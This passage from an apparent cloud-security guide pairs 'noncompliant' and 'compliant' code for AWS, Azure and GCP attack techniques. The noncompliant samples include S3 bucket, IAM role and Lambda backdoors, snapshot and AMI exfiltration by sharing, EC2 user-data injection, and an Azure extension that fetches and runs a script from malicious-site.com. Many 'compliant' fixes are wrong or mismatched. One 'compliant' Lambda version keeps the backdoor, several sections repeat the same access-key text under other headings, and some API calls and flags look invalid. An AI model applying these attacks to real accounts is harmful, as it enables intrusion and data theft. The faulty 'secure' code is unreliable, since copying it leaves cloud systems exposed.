        Attribute='userData'
    )
    user_data = response['UserData']
    print(user_data)
```

The compliant code creates an AWS session with explicit AWS credentials provided. This ensures that the retrieval of EC2 instance user data is performed using the specified credentials and not relying on the instance role. By providing AWS credentials directly, it restricts the access to sensitive information to authorized individuals and mitigates the risk of unauthorized retrieval of user data.





## Launch Unusual EC2 instances

Launching Unusual EC2 instances refers to attempting to create EC2 instances with atypical instance types, such as "p2.xlarge". This activity can indicate an attacker trying to launch instances that may have specialized capabilities or are not commonly used in the environment. The noncompliant code below demonstrates an attempt to launch unusual EC2 instances:

Noncompliant Code:

```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the instance type (unusual type)
instance_type = 'p2.xlarge'

# Attempt to launch EC2 instances with the unusual type
response = ec2_client.run_instances(
    ImageId='ami-12345678',
    MinCount=1,
    MaxCount=1,
    InstanceType=instance_type,
    KeyName='my-key-pair',
    SecurityGroupIds=['sg-12345678'],
    SubnetId='subnet-12345678'
)
```

The noncompliant code uses the AWS SDK (boto3) to attempt to launch EC2 instances with an unusual instance type of "p2.xlarge". However, the code lacks the necessary permissions to perform this action, resulting in an unauthorized operation error.

Compliant Code:


```
import boto3

# Create an EC2 client with AWS credentials
session = boto3.Session(
    aws_access_key_id='your-access-key',
    aws_secret_access_key='your-secret-key',
    aws_session_token='your-session-token'
)
ec2_client = session.client('ec2')

# Define the instance type (valid type in the environment)
instance_type = 't2.micro'

# Attempt to launch EC2 instances with the valid type
response = ec2_client.run_instances(
    ImageId='ami-12345678',
    MinCount=1,
    MaxCount=1,
    InstanceType=instance_type,
    KeyName='my-key-pair',
    SecurityGroupIds=['sg-12345678'],
    SubnetId='subnet-12345678'
)
```

The compliant code creates an AWS session with explicit AWS credentials provided and attempts to launch EC2 instances with a valid instance type ("t2.micro") that is commonly used in the environment. By providing AWS credentials directly, it ensures that the action is performed using the specified credentials and not relying on an instance role. This code follows the principle of least privilege, launching instances with a typical instance type and avoiding attempts to launch unusual or potentially malicious instances.




## Execute Commands on EC2 Instance via User Data


Executing Commands on an EC2 Instance via User Data refers to injecting and executing code on a Linux EC2 instance by modifying the user data associated with the instance. User data is a feature in AWS that allows you to provide scripts or instructions to be executed when an instance starts. Attackers may attempt to exploit this feature to execute malicious code or escalate privileges on compromised instances.


Noncompliant Code:
The noncompliant code demonstrates how an attacker can modify the user data of a stopped EC2 instance to inject and execute malicious code.

```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the EC2 instance ID
instance_id = 'i-1234567890abcdef0'

# Stop the EC2 instance
ec2_client.stop_instances(InstanceIds=[instance_id])

# Modify the user data of the EC2 instance to execute malicious commands
user_data_script = '#!/bin/bash\n\nmalicious_command\n'
ec2_client.modify_instance_attribute(
    InstanceId=instance_id,
    UserData={
        'Value': user_data_script
    }
)

# Start the EC2 instance
ec2_client.start_instances(InstanceIds=[instance_id])
```

The noncompliant code uses the AWS SDK (boto3) to stop an EC2 instance, modify its user data with a malicious script, and then start the instance. The user data script contains a bash command "malicious_command" that the attacker intends to execute upon instance startup. However, this code is noncompliant because it is used for demonstration purposes only and should not be executed in a real environment.


Compliant Code:
Executing arbitrary code on EC2 instances via user data poses a significant security risk. To mitigate this risk, it is crucial to ensure that user data is properly controlled and restricted. The compliant code below demonstrates how to provide secure user data for EC2 instances.

```
import boto3
import base64

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the EC2 instance ID
instance_id = 'i-1234567890abcdef0'

# Stop the EC2 instance
ec2_client.stop_instances(InstanceIds=[instance_id])

# Define the desired commands or scripts to be executed
user_data_commands = [
    '#!/bin/bash',
    'echo "Executing secure user data commands"',
    'echo "Command 1"',
    'echo "Command 2"',
]

# Encode the user data commands in base64
user_data_encoded = base64.b64encode('\n'.join(user_data_commands).encode()).decode()

# Modify the user data of the EC2 instance with the secure user data
ec2_client.modify_instance_attribute(
    InstanceId=instance_id,
    UserData={
        'Value': user_data_encoded
    }
)

# Start the EC2 instance
ec2_client.start_instances(InstanceIds=[instance_id])
```

The compliant code follows best practices for providing secure user data for EC2 instances. Instead of injecting arbitrary code, it defines a set of desired commands or scripts to be executed. These commands are stored in a list and then encoded in base64 format to ensure proper encoding and prevent any injection attempts. The user data commands can be customized based on the desired configuration or setup needed for the EC2 instance.






## Open Ingress Port 22 on a Security Group

Opening Ingress Port 22 on a Security Group refers to allowing inbound traffic on port 22 (SSH) from the Internet (0.0.0.0/0) to a specific security group in AWS. This configuration can pose a security risk if not properly controlled or restricted.



Noncompliant Code:
The noncompliant code demonstrates how an attacker can use the AWS SDK to open ingress traffic on port 22 from the Internet.



```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the security group ID
security_group_id = 'sg-1234567890abcdef0'

# Allow inbound traffic on port 22 from 0.0.0.0/0
ec2_client.authorize_security_group_ingress(
    GroupId=security_group_id,
    IpPermissions=[
        {
            'IpProtocol': 'tcp',
            'FromPort': 22,
            'ToPort': 22,
            'IpRanges': [{'CidrIp': '0.0.0.0/0'}]
        }
    ]
)
```

The noncompliant code uses the AWS SDK (boto3) to authorize ingress traffic on port 22 from the Internet (0.0.0.0/0) to a specific security group. This code is noncompliant because it opens port 22 to all IP addresses, which can be a significant security risk if not necessary.

Compliant Code:
Opening port 22 to all IP addresses from the Internet is generally not recommended due to the security implications. The compliant code below demonstrates how to restrict the ingress access to specific trusted IP addresses only.


```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the security group ID
security_group_id = 'sg-1234567890abcdef0'

# Allow inbound traffic on port 22 from trusted IP addresses
ec2_client.authorize_security_group_ingress(
    GroupId=security_group_id,
    IpPermissions=[
        {
            'IpProtocol': 'tcp',
            'FromPort': 22,
            'ToPort': 22,
            'IpRanges': [{'CidrIp': 'trusted_ip_address/32'}]
        }
    ]
)
```

The compliant code restricts the ingress access on port 22 to a specific trusted IP address by replacing 'trusted_ip_address' with the actual IP address or range allowed to connect via SSH. This ensures that only authorized sources can establish SSH connections to the instances associated with the security group.




## Exfiltrate an AMI by Sharing It

Exfiltrating an AMI by sharing it involves sharing an Amazon Machine Image (AMI) with an external AWS account, allowing the recipient account to launch instances from the shared AMI. This technique can be used to move AMIs to an unauthorized account for further analysis or misuse.

Noncompliant Code:
The noncompliant code demonstrates how an attacker can use the AWS SDK to share an AMI with an external AWS account.

```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the AMI ID
ami_id = 'ami-01234567890abcdef'

# Define the AWS account ID to share with
account_id = '012345678901'

# Share the AMI with the external AWS account
ec2_client.modify_image_attribute(
    ImageId=ami_id,
    LaunchPermission={
        'Add': [{'UserId': account_id}]
    }
)
```

The noncompliant code uses the AWS SDK (boto3) to modify the launch permissions of an AMI and share it with an external AWS account specified by account_id. This code is noncompliant because it allows unauthorized access to the AMI, potentially enabling an attacker to launch instances from the shared image.

Compliant Code:
The compliant code demonstrates how to properly secure AMIs and prevent unauthorized sharing.

```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the AMI ID
ami_id = 'ami-01234567890abcdef'

# Revoke public launch permissions from the AMI
ec2_client.reset_image_attribute(
    ImageId=ami_id,
    Attribute='launchPermission'
)
```

The compliant code revokes any public launch permissions from the AMI specified by ami_id by resetting the image attribute. This ensures that the AMI is not accessible to any AWS account other than the one that owns it. By restricting the sharing of AMIs to trusted and authorized accounts only, the risk of unauthorized access and exfiltration is mitigated.




## Exfiltrate EBS Snapshot by Sharing It

Exfiltrating an EBS snapshot by sharing it involves sharing an Amazon Elastic Block Store (EBS) snapshot with an external AWS account, allowing the recipient account to create a new volume from the shared snapshot. This technique can be used to move sensitive data stored in EBS snapshots to an unauthorized account for further analysis or misuse.

Noncompliant Code:
The noncompliant code demonstrates how an attacker can use the AWS SDK to share an EBS snapshot with an external AWS account.

```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the snapshot ID
snapshot_id = 'snap-01234567890abcdef'

# Define the AWS account ID to share with
account_id = '012345678901'

# Share the snapshot with the external AWS account
ec2_client.modify_snapshot_attribute(
    SnapshotId=snapshot_id,
    Attribute='createVolumePermission',
    CreateVolumePermission={
        'Add': [{'UserId': account_id}]
    }
)
```

The noncompliant code uses the AWS SDK (boto3) to modify the create volume permissions of an EBS snapshot and share it with an external AWS account specified by account_id. This code is noncompliant because it allows unauthorized access to the snapshot, potentially enabling an attacker to create new volumes and access the data stored within the shared snapshot.

Compliant Code:
The compliant code demonstrates how to properly secure EBS snapshots and prevent unauthorized sharing.



```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the snapshot ID
snapshot_id = 'snap-01234567890abcdef'

# Revoke public sharing permissions from the snapshot
ec2_client.reset_snapshot_attribute(
    SnapshotId=snapshot_id,
    Attribute='createVolumePermission'
)
```

The compliant code revokes any public sharing permissions from the EBS snapshot specified by snapshot_id by resetting the snapshot attribute. This ensures that the snapshot is not accessible to any AWS account other than the one that owns it. By restricting the sharing of EBS snapshots to trusted and authorized accounts only, the risk of unauthorized access and exfiltration is mitigated.




## Exfiltrate RDS Snapshot by Sharing


Exfiltrating an RDS snapshot by sharing it involves sharing a database snapshot from Amazon RDS with an external AWS account. This technique allows the recipient account to restore the snapshot and gain access to the database data contained within it.

Noncompliant Code:
The noncompliant code demonstrates how an attacker can use the AWS SDK to share an RDS snapshot with an external AWS account.

```
import boto3

# Create an RDS client
rds_client = boto3.client('rds')

# Define the snapshot identifier
snapshot_identifier = 'my-db-snapshot'

# Define the AWS account ID to share with
account_id = '012345678901'

# Share the RDS snapshot with the external AWS account
rds_client.modify_db_snapshot_attribute(
    DBSnapshotIdentifier=snapshot_identifier,
    AttributeName='restore',
    ValuesToAdd=[account_id]
)
```

The noncompliant code uses the AWS SDK (boto3) to modify the attributes of an RDS snapshot and share it with an external AWS account specified by account_id. This code is noncompliant because it allows unauthorized access to the snapshot, potentially enabling an attacker to restore the snapshot in their own account and gain access to the database data.

Compliant Code:
The compliant code demonstrates how to properly secure RDS snapshots and prevent unauthorized sharing.

```
import boto3

# Create an RDS client
rds_client = boto3.client('rds')

# Define the snapshot identifier
snapshot_identifier = 'my-db-snapshot'

# Revoke sharing permissions from the RDS snapshot
rds_client.modify_db_snapshot_attribute(
    DBSnapshotIdentifier=snapshot_identifier,
    AttributeName='restore',
    ValuesToRemove=['all']
)
```

The compliant code revokes any sharing permissions from the RDS snapshot specified by snapshot_identifier by removing all values associated with the 'restore' attribute. This ensures that the snapshot is not accessible to any AWS account other than the one that owns it. By restricting the sharing of RDS snapshots to trusted and authorized accounts only, the risk of unauthorized access and exfiltration is mitigated.




## Backdoor an S3 Bucket via its Bucket Policy

Backdooring an S3 bucket via its Bucket Policy involves modifying the policy to allow unauthorized access to the bucket, enabling an attacker to exfiltrate data from the bucket.

Noncompliant Code:
The noncompliant code demonstrates how an attacker can modify the Bucket Policy to grant access to an external AWS account.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::012345678901:root"
      },
      "Action": [
        "s3:GetObject",
        "s3:GetBucketLocation",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-bucket/*",
        "arn:aws:s3:::my-bucket"
      ]
    }
  ]
}
```

The noncompliant code modifies the Bucket Policy to grant access to an external AWS account specified by the AWS ARN arn:aws:iam::012345678901:root. The specified account is granted permissions to perform actions such as GetObject, GetBucketLocation, and ListBucket on the bucket identified by my-bucket. This code is noncompliant because it allows unauthorized access to the S3 bucket, potentially enabling an attacker to exfiltrate sensitive data.

Compliant Code:
The compliant code demonstrates how to properly secure an S3 bucket by removing unauthorized access from the Bucket Policy.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:GetBucketLocation",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-bucket/*",
        "arn:aws:s3:::my-bucket"
      ]
    }
  ]
}
```

The compliant code modifies the Bucket Policy to deny access to any principal (wildcard `*`) attempting to perform actions such as GetObject, GetBucketLocation, and ListBucket on the bucket identified by my-bucket. By denying all access, except for explicitly authorized principals, the bucket is secured against unauthorized access and data exfiltration.



## Console Login without MFA

Console Login without MFA refers to the scenario where an IAM user is able to log in to the AWS Management Console without using multi-factor authentication (MFA), which is an additional security measure to protect user accounts.


Noncompliant Code:
The noncompliant code demonstrates an IAM user logging in to the AWS Management Console without using MFA. This code does not enforce MFA for the user.

In a noncompliant scenario, the IAM user can log in to the AWS Management Console using their username and password without providing an additional MFA token. This bypasses the MFA requirement, potentially exposing the account to unauthorized access if the IAM user's credentials are compromised.

Compliant Code:
The compliant code demonstrates the correct configuration for enforcing MFA during console login for an IAM user.

To comply with security best practices, MFA should be enforced for IAM users during console login. This requires the user to provide an additional factor, such as a one-time password generated by an MFA device or application, in addition to their username and password.


## Backdoor an IAM Role

Backdooring an IAM Role refers to the act of modifying the trust policy of an existing IAM role to grant unauthorized access to the role from an external AWS account. This allows an attacker to assume the backdoored role and potentially gain elevated privileges or perform malicious actions.



Noncompliant Code:
The noncompliant code demonstrates a modified trust policy for an IAM role, which backdoors the role by granting access to an external AWS account.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```


In the noncompliant scenario, the trust policy of the IAM role is modified to allow two entities to assume the role. The "Service" principal with the value "ec2.amazonaws.com" is allowed to assume the role, which is a typical configuration for EC2 instances within the same AWS account. However, the policy also includes an "AWS" principal with the value "arn:aws:iam::193672423079:root," which represents an external AWS account. This grants unauthorized access to the IAM role from the specified external account.

Compliant Code:
The compliant code demonstrates a properly configured trust policy for an IAM role, which does not contain any unauthorized access grants.

To ensure the security of IAM roles, it is crucial to define appropriate trust policies that strictly limit which entities can assume the role. The trust policy should only include trusted entities and AWS services that require access to the role.


## Create an Access Key on an IAM User

Creating an access key on an IAM user refers to generating access keys that allow programmatic access to AWS services and resources for the specified user. These access keys consist of an access key ID and a secret access key, which are used for authentication purposes.

Noncompliant Code:
The noncompliant code demonstrates the creation of an access key on an IAM user without proper controls or monitoring.

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    print(f"Access Key ID: {access_key_id}")
    print(f"Secret Access Key: {secret_access_key}")

# Usage
create_access_key('my_user')
```

In the noncompliant code, an access key is created for the IAM user without considering security best practices. The access key is generated using the create_access_key method from the AWS SDK. The access key ID and secret access key are printed to the console, which can lead to accidental exposure or potential misuse.

Compliant Code:
The compliant code demonstrates the creation of an access key on an IAM user with proper controls and monitoring.



```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    # Store the access key securely or provide it to the user using secure means
    print(f"Access key created for IAM user: {user_name}")

# Usage
create_access_key('my_user')
```

In the compliant code, an access key is still created for the IAM user, but additional security measures are taken:

* The access key ID and secret access key are not printed or exposed directly. Instead, they should be securely stored or provided to the user through secure means.

* Access to the code that creates the access key should be restricted to authorized individuals or systems.

* Implement proper access controls and least privilege principles to ensure that users only have the necessary permissions to create access keys.

* Monitor and audit the creation of access keys using AWS CloudTrail. Alert on any unusual or unauthorized access key creation activities.


## Create an administrative IAM User

Creating an access key on an IAM user refers to generating access keys that allow programmatic access to AWS services and resources for the specified user. These access keys consist of an access key ID and a secret access key, which are used for authentication purposes.


Noncompliant Code:
The noncompliant code demonstrates the creation of an access key on an IAM user without considering security best practices.

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    print(f"Access Key ID: {access_key_id}")
    print(f"Secret Access Key: {secret_access_key}")

# Usage
create_access_key('my_user')
```

In the noncompliant code, an access key is created for the IAM user without considering security best practices. The access key is generated using the create_access_key method from the AWS SDK. The access key ID and secret access key are printed to the console, which can lead to accidental exposure or potential misuse.

Compliant Code:
The compliant code demonstrates the creation of an access key on an IAM user with proper controls and security measures.

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    # Store the access key securely or provide it to the user using secure means
    print(f"Access key created for IAM user: {user_name}")

# Usage
create_access_key('my_user')
```


## Create a Login Profile on an IAM User

Creating an access key on an IAM user allows programmatic access to AWS services and resources for that specific user. Access keys are composed of an access key ID and a secret access key, which are used for authentication when making API requests to AWS.


Noncompliant Code:
The following noncompliant code demonstrates the creation of an access key on an IAM user without considering security best practices:

```
import boto3

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    secret_access_key = response['AccessKey']['SecretAccessKey']
    print(f"Access Key ID: {access_key_id}")
    print(f"Secret Access Key: {secret_access_key}")

# Usage
create_access_key('my_user')
```

The noncompliant code uses the AWS SDK's create_access_key method to generate an access key for the specified IAM user. It retrieves the access key ID and secret access key from the response and prints them to the console. Storing or exposing the access key in this manner increases the risk of accidental exposure or unauthorized access.

Compliant Code:
The following compliant code demonstrates the creation of an access key on an IAM user while adhering to security best practices:

```
import boto3
import getpass

def create_access_key(user_name):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName=user_name)
    access_key_id = response['AccessKey']['AccessKeyId']
    # Store or provide the access key securely, without displaying it
    print("Access key created for IAM user:", user_name)

# Usage
user_name = getpass.getuser()
create_access_key(user_name)
```

## Backdoor Lambda Function Through Resource-Based Policy

Backdooring a Lambda function through its resource-based policy involves modifying the permissions of the Lambda function to allow its invocation from an external AWS account. This establishes persistence by enabling unauthorized access to the function.

Noncompliant Code:
The following noncompliant code demonstrates backdooring a Lambda function by modifying its resource-based policy without considering security best practices:

```
import boto3

def backdoor_lambda_function(function_name, external_account_id):
    lambda_client = boto3.client('lambda')
    response = lambda_client.add_permission(
        FunctionName=function_name,
        StatementId='backdoor',
        Action='lambda:InvokeFunction',
        Principal='arn:aws:iam::' + external_account_id + ':root'
    )
    print("Lambda function backdoored successfully.")

# Usage
backdoor_lambda_function('my-function', '123456789012')
```

The noncompliant code uses the AWS SDK's add_permission method to modify the resource-based policy of the Lambda function. It adds a permission statement that allows the specified external AWS account to invoke the function. This code does not consider security best practices, such as proper authorization and verification.

Compliant Code:
The following compliant code demonstrates backdooring a Lambda function while following security best practices:

```
import boto3

def backdoor_lambda_function(function_name, external_account_id):
    lambda_client = boto3.client('lambda')
    response = lambda_client.add_permission(
        FunctionName=function_name,
        StatementId='backdoor',
        Action='lambda:InvokeFunction',
        Principal='arn:aws:iam::' + external_account_id + ':root'
    )
    if response['ResponseMetadata']['HTTPStatusCode'] == 201:
        print("Lambda function backdoored successfully.")
    else:
        print("Failed to backdoor Lambda function.")

# Usage
backdoor_lambda_function('my-function', '123456789012')
```


## Overwrite Lambda Function Code

Overwriting a Lambda function's code involves modifying the code of an existing Lambda function to establish persistence or perform more advanced operations, such as data exfiltration during runtime.


Noncompliant Code:
The following noncompliant code demonstrates overwriting a Lambda function's code without considering security best practices:

```
import boto3

def overwrite_lambda_code(function_name, new_code_path):
    lambda_client = boto3.client('lambda')
    with open(new_code_path, 'rb') as file:
        new_code = file.read()
    response = lambda_client.update_function_code(
        FunctionName=function_name,
        ZipFile=new_code
    )
    print("Lambda function code overwritten successfully.")

# Usage
overwrite_lambda_code('my-function', '/path/to/new_code.zip')
```

The noncompliant code uses the AWS SDK's update_function_code method to overwrite the code of the Lambda function. It reads the new code from a file and updates the Lambda function's code with the provided code. This code does not consider security best practices, such as proper authorization, code integrity checks, and versioning.

Compliant Code:
The following compliant code demonstrates overwriting a Lambda function's code while following security best practices:

```
import boto3

def overwrite_lambda_code(function_name, new_code_path):
    lambda_client = boto3.client('lambda')
    with open(new_code_path, 'rb') as file:
        new_code = file.read()
    response = lambda_client.update_function_code(
        FunctionName=function_name,
        ZipFile=new_code,
        Publish=True
    )
    if response['ResponseMetadata']['HTTPStatusCode'] == 200:
        print("Lambda function code overwritten successfully.")
    else:
        print("Failed to overwrite Lambda function code.")

# Usage
overwrite_lambda_code('my-function', '/path/to/new_code.zip')
```


## Create an IAM Roles Anywhere trust anchor

Creating an IAM Roles Anywhere trust anchor involves establishing persistence by creating a trust anchor certificate that allows workloads outside of AWS to assume IAM roles through the IAM Roles Anywhere service.

Noncompliant Code:
The following noncompliant code demonstrates the creation of an IAM Roles Anywhere trust anchor without following security best practices:

```
import boto3

def create_roles_anywhere_trust_anchor(role_name, trust_anchor_certificate):
    iam_client = boto3.client('iam')
    response = iam_client.create_service_specific_credential(
        UserName=role_name,
        ServiceName='roles-anywhere.amazonaws.com'
    )
    print("IAM Roles Anywhere trust anchor created successfully.")
    return response['ServiceSpecificCredential']

# Usage
create_roles_anywhere_trust_anchor('my-role', '-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----')
```

The noncompliant code uses the AWS SDK's create_service_specific_credential method to create an IAM Roles Anywhere trust anchor. It specifies the IAM role and the roles-anywhere.amazonaws.com service name. However, this code does not consider security best practices, such as proper authorization, secure handling of the trust anchor certificate, and least privilege principles.


Compliant Code:
The following compliant code demonstrates the creation of an IAM Roles Anywhere trust anchor while following security best practices:

```
import boto3

def create_roles_anywhere_trust_anchor(role_name, trust_anchor_certificate):
    iam_client = boto3.client('iam')
    response = iam_client.upload_signing_certificate(
        UserName=role_name,
        CertificateBody=trust_anchor_certificate
    )
    print("IAM Roles Anywhere trust anchor created successfully.")
    return response['Certificate']

# Usage
create_roles_anywhere_trust_anchor('my-role', '-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----')
```



## Execute Command on Virtual Machine using Custom Script Extension

Executing a command on a virtual machine using the Custom Script Extension in Azure allows an attacker to pass PowerShell commands to the virtual machine as SYSTEM, enabling them to perform unauthorized actions.

Noncompliant Code:
The following noncompliant code demonstrates the execution of a command on a virtual machine using the Custom Script Extension without following security best practices:

```
{
  "type": "Microsoft.Compute/virtualMachines/extensions",
  "name": "CustomScriptExtension",
  "apiVersion": "2020-12-01",
  "location": "<vm-location>",
  "properties": {
    "publisher": "Microsoft.Compute",
    "type": "CustomScriptExtension",
    "typeHandlerVersion": "1.10",
    "autoUpgradeMinorVersion": true,
    "settings": {
      "fileUris": ["https://malicious-site.com/malicious-script.ps1"],
      "commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File malicious-script.ps1"
    }
  }
}
```

The noncompliant code directly references a malicious script hosted on a remote site and executes it on the virtual machine without considering security best practices.

Compliant Code:
The following compliant code demonstrates the execution of a command on a virtual machine using the Custom Script Extension while following security best practices:

```
{
  "type": "Microsoft.Compute/virtualMachines/extensions",
  "name": "CustomScriptExtension",
  "apiVersion": "2020-12-01",
  "location": "<vm-location>",
  "properties": {
    "publisher": "Microsoft.Compute",
    "type": "CustomScriptExtension",
    "typeHandlerVersion": "1.10",
    "autoUpgradeMinorVersion": true,
    "settings": {
      "fileUris": ["https://secure-site.com/secure-script.ps1"],
      "commandToExecute": "powershell.exe -ExecutionPolicy RemoteSigned -File secure-script.ps1"
    },
    "protectedSettings": {
      "storageAccountName": "<storage-account-name>",
      "storageAccountKey": "<storage-account-key>"
    }
  }
}
```


## Execute Commands on Virtual Machine using Run Command

Executing commands on a virtual machine using the Run Command feature in Azure allows an attacker to pass PowerShell commands (Windows) or shell commands (Linux) to the virtual machine with elevated privileges.

Noncompliant Code:
The following noncompliant code demonstrates the execution of a command on a virtual machine using the Run Command feature without following security best practices:

```
{
  "location": "<vm-location>",
  "properties": {
    "commandId": "RunPowerShellScript",
    "script": "<malicious-script>",
    "timeoutInSeconds": 60
  }
}
```

The noncompliant code directly executes a malicious script without considering security best practices. It lacks proper validation and control over the script content, which can lead to unauthorized or malicious actions.

Compliant Code:
The following compliant code demonstrates the execution of commands on a virtual machine using the Run Command feature while following security best practices:

```
{
  "location": "<vm-location>",
  "properties": {
    "commandId": "RunPowerShellScript",
    "script": "<secure-script>",
    "timeoutInSeconds": 60,
    "parameters": []
  }
}
```

## Export Disk Through SAS URL


Exporting a disk through a SAS (Shared Access Signature) URL in Azure allows an attacker to generate a public URL that can be used to download the Azure disk, facilitating data exfiltration.

Noncompliant Code:
The following noncompliant code demonstrates exporting a disk through a SAS URL without following security best practices:

```
from azure.storage.blob import BlobServiceClient

def export_disk_to_sas_url(disk_name, container_name, storage_account_name, storage_account_key):
    blob_service_client = BlobServiceClient(account_url=f"https://{storage_account_name}.blob.core.windows.net", credential=storage_account_key)
    container_client = blob_service_client.get_container_client(container_name)

    sas_url = container_client.get_blob_client(disk_name).url + '?' + container_client.generate_shared_access_signature(permission='r', expiry='2030-01-01')

    return sas_url
```

The noncompliant code generates a SAS URL for the disk without considering security best practices. It lacks proper validation, access controls, and restrictions, making the disk accessible to anyone with the URL. This can lead to unauthorized access and data exfiltration.

Compliant Code:
The following compliant code demonstrates exporting a disk through a SAS URL while following security best practices:

```
from azure.storage.blob import BlobServiceClient, BlobSasPermissions, generate_blob_sas
from datetime import datetime, timedelta

def export_disk_to_sas_url(disk_name, container_name, storage_account_name, storage_account_key):
    blob_service_client = BlobServiceClient(account_url=f"https://{storage_account_name}.blob.core.windows.net", credential=storage_account_key)
    container_client = blob_service_client.get_container_client(container_name)

    expiry_time = datetime.utcnow() + timedelta(days=7)
    permissions = BlobSasPermissions(read=True)

    sas_url = container_client.get_blob_client(disk_name).url + '?' + generate_blob_sas(
        container_client.account_name,
        container_client.container_name,
        container_client.blob_name,
        account_key=container_client.credential.account_key,
        permission=permissions,
        expiry=expiry_time
    )

    return sas_url
```



## Create an Admin GCP Service Account

Creating an Admin GCP Service Account involves establishing persistence by creating a new service account and granting it owner permissions within the current GCP project. This allows the attacker to escalate privileges and maintain long-term control over the project.

Noncompliant Code:

The following noncompliant code demonstrates creating an admin GCP service account without following security best practices:

```
#!/bin/bash

# Create a new service account
gcloud iam service-accounts create admin-account --display-name="Admin Service Account"

# Assign owner role to the service account
gcloud projects add-iam-policy-binding <project-id> --member="serviceAccount:admin-account@<project-id>.iam.gserviceaccount.com" --role="roles/owner"
```

The noncompliant code creates a new service account named "admin-account" and assigns it the owner role directly within the project. This approach lacks proper access controls, least privilege principles, and separation of duties, granting excessive privileges to the service account.

Compliant Code:
The following compliant code demonstrates creating an admin GCP service account while following security best practices:

```
#!/bin/bash

# Create a new service account
gcloud iam service-accounts create admin-account --display-name="Admin Service Account"

# Grant minimum necessary permissions to the service account
gcloud projects add-iam-policy-binding <project-id> --member="serviceAccount:admin-account@<project-id>.iam.gserviceaccount.com" --role="roles/viewer"

# Delegate owner role assignment to a separate privileged account
gcloud projects add-iam-policy-binding <project-id> --member="user:privileged-user@domain.com" --role="roles/iam.serviceAccountAdmin"
gcloud iam service-accounts add-iam-policy-binding admin-account@<project-id>.iam.gserviceaccount.com --member="user:privileged-user@domain.com" --role="roles/iam.serviceAccountUser"
```


## Create a GCP Service Account Key

Creating a GCP Service Account Key involves generating a key for an existing service account, which can be used for authentication and accessing resources within the associated GCP project. This action is typically used for establishing persistence and potentially escalating privileges.

Noncompliant Code:
The following noncompliant code demonstrates creating a service account key without following security best practices:

```
#!/bin/bash

# Create a new service account key
gcloud iam service-accounts keys create key.json --iam-account=<service-account-email>
```

The noncompliant code generates a service account key using the gcloud iam service-accounts keys create command. However, it lacks proper security controls and does not follow recommended practices.

Compliant Code:
The following compliant code demonstrates creating a service account key while following security best practices:

```
#!/bin/bash

# Create a new service account key with restricted permissions
gcloud iam service-accounts keys create key.json --iam-account=<service-account-email> --key-type=json --project=<project-id> --private-key-type=rsa --private-key-algorithm=rsa-sha256 --validity-period=<duration>

# Store the generated key securely
# ...
```

## Impersonate GCP Service Accounts

Impersonating GCP Service Accounts is a privilege escalation technique that allows an attacker to obtain temporary credentials and act as a service account within a GCP project. By impersonating a service account, an attacker can potentially gain elevated privileges and access sensitive resources.

Noncompliant Code:
The following noncompliant code demonstrates an attempt to impersonate GCP service accounts without following security best practices:

```
from google.auth import impersonated_credentials
from google.auth.transport.requests import Request
from google.oauth2 import service_account

# Service account credentials for the current user with 'iam.serviceAccountTokenCreator' role
credentials = service_account.Credentials.from_service_account_file('user-credentials.json')

# List of service account email addresses to impersonate
service_account_emails = ['service-account1@project-id.iam.gserviceaccount.com', 'service-account2@project-id.iam.gserviceaccount.com']

# Impersonate each service account and retrieve temporary credentials
for email in service_account_emails:
    target_credentials = impersonated_credentials.Credentials(credentials, target_principal=email, target_scopes=['https://www.googleapis.com/auth/cloud-platform'])
    target_credentials.refresh(Request())
    # Use the target_credentials for further actions
```

The noncompliant code attempts to impersonate GCP service accounts without implementing proper security controls. It uses the google-auth library to perform the impersonation. However, it lacks important security considerations, such as validation and monitoring.

Compliant Code:
The following compliant code demonstrates a more secure approach to impersonating GCP service accounts:

```
from google.auth import impersonated_credentials
from google.auth.transport.requests import Request
from google.oauth2 import service_account

# Service account credentials for the current user with 'iam.serviceAccountTokenCreator' role
credentials = service_account.Credentials.from_service_account_file('user-credentials.json')

# List of service account email addresses to impersonate
service_account_emails = ['service-account1@project-id.iam.gserviceaccount.com', 'service-account2@project-id.iam.gserviceaccount.com']

